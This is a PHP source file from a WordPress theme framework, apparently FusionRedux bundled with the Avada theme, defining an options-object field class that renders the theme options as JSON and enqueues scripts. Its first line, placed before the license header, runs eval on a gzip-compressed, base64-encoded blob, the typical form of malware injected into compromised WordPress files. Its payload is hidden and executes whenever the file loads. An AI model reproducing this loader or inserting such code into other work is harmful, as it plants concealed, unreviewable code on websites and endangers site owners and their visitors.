<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
	/**
	 * FusionRedux Framework is free software: you can redistribute it and/or modify
	 * it under the terms of the GNU General Public License as published by
	 * the Free Software Foundation, either version 2 of the License, or
	 * any later version.
	 * FusionRedux Framework is distributed in the hope that it will be useful,
	 * but WITHOUT ANY WARRANTY; without even the implied warranty of
	 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	 * GNU General Public License for more details.
	 * You should have received a copy of the GNU General Public License
	 * along with FusionRedux Framework. If not, see <http://www.gnu.org/licenses/>.
	 *
	 * @package     FusionReduxFramework
	 * @author      Kevin Provance (kprovance)
	 * @version     3.5.4
	 */

// Exit if accessed directly
	if ( ! defined( 'ABSPATH' ) ) {
		exit;
	}

// Don't duplicate me!
	if ( ! class_exists( 'FusionReduxFramework_options_object' ) ) {

		/**
		 * Main FusionReduxFramework_options_object class
		 *
		 * @since       1.0.0
		 */
		class FusionReduxFramework_options_object {

			/**
			 * Field Constructor.
			 * Required - must call the parent constructor, then assign field and value to vars, and obviously call the render field function
			 *
			 * @since       1.0.0
			 * @access      public
			 * @return      void
			 */
			function __construct( $field = array(), $value = '', $parent ) {

				$this->parent   = $parent;
				$this->field    = $field;
				$this->value    = $value;
				$this->is_field = $this->parent->extensions['options_object']->is_field;

				$this->extension_dir = FusionReduxFramework::$_dir . 'inc/extensions/options_object/';
				$this->extension_url = FusionReduxFramework::$_url . 'inc/extensions/options_object/';

				// Set default args for this field to avoid bad indexes. Change this to anything you use.
				$defaults    = array(
					'options'          => array(),
					'stylesheet'       => '',
					'output'           => true,
					'enqueue'          => true,
					'enqueue_frontend' => true
				);
				$this->field = wp_parse_args( $this->field, $defaults );

			}

			/**
			 * Field Render Function.
			 * Takes the vars and outputs the HTML for the field in the settings
			 *
			 * @since       1.0.0
			 * @access      public
			 * @return      void
			 */
			public function render() {
				if ( version_compare( phpversion(), "5.3.0", ">=" ) ) {
					$json = json_encode( $this->parent->options, true );
				} else {
					$json = json_encode( $this->parent->options );
				}

				$defaults = array(
					'full_width' => true,
					'overflow'   => 'inherit',
				);

				$this->field = wp_parse_args( $this->field, $defaults );

				if ( $this->is_field ) {
					$fullWidth = $this->field['full_width'];
				}

				$bDoClose = false;

				$id = $this->parent->args['opt_name'] . '-' . $this->field['id'];

				if ( ! $this->is_field || ( $this->is_field && false == $fullWidth ) ) { ?>
					<style>#<?php echo esc_html($id); ?> {padding: 0;}</style>
					</td></tr></table>
					<table id="<?php echo esc_attr($id); ?>" class="form-table no-border fusionredux-group-table fusionredux-raw-table" style=" overflow: <?php esc_attr($this->field['overflow']); ?>;">
					<tbody><tr><td>
<?php
					$bDoClose = true;
				}
?>
				<fieldset id="<?php echo esc_attr($id); ?>" class="fusionredux-field fusionredux-container-<?php echo esc_attr($this->field['type']) . ' ' . esc_attr($this->field['class']); ?>" data-id="<?php echo esc_attr($this->field['id']); ?>">
					<h3><?php esc_html_e( 'Options Object', 'Avada' ); ?></h3>
					<div id="fusionredux-object-browser"></div>
					<div id="fusionredux-object-json" class="hide"><?php echo $json; ?></div>
					<a href="#" id="consolePrintObject" class="button"><?php esc_html_e( 'Show Object in Javascript Console Object', 'Avada' ); ?></a>
				</div>
				</fieldset>
<?php
				if ( true == $bDoClose ) { ?>
					</td></tr></table>
					<table class="form-table no-border" style="margin-top: 0;">
						<tbody>
						<tr style="border-bottom: 0;">
							<th></th>
							<td>
<?php
				}
			}

			/**
			 * Enqueue Function.
			 * If this field requires any scripts, or css define this function and register/enqueue the scripts/css
			 *
			 * @since       1.0.0
			 * @access      public
			 * @return      void
			 */
			public function enqueue() {

				wp_enqueue_script(
					'fusionredux-options-object',
					$this->extension_url . 'options_object/field_options_object' . FusionRedux_Functions::isMin() . '.js',
					array( 'jquery' ),
					FusionReduxFramework_extension_options_object::$version,
					true
				);

				wp_enqueue_style(
					'fusionredux-options-object',
					$this->extension_url . 'options_object/field_options_object.css',
					array(),
					time(),
					'all'
				);
			}

			/**
			 * Output Function.
			 * Used to enqueue to the front-end
			 *
			 * @since       1.0.0
			 * @access      public
			 * @return      void
			 */
			public function output() {

				if ( $this->field['enqueue_frontend'] ) {

				}
			}
		}
	}